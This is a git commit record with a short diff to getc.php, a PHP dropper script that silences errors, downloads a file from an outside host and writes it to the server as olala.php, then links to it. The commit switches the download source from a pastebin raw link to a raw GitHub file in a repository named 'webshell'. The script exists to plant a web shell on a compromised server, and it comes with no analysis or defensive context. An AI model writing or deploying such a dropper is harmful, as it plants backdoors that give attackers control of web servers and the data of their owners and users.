a01475cf77bd0f5f05027b7a78c4a574ac231275
AzhariKun <76898637+AzhariKun@users.noreply.github.com>
2023-08-04 15:47:03 +0700

    Update getc.php

--- getc.php
+++ getc.php
@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 $shell = fopen("olala.php", "w");
-$file_shell = file_get_contents("https://pastebin.com/raw/ZyfBjcqJ");
+$file_shell = file_get_contents("https://raw.githubusercontent.com/AzhariKun/webshell/main/lites.php");
 fwrite($shell, $file_shell);
 fclose($shell);
 echo "<a href='olala.php'>Here</a>";
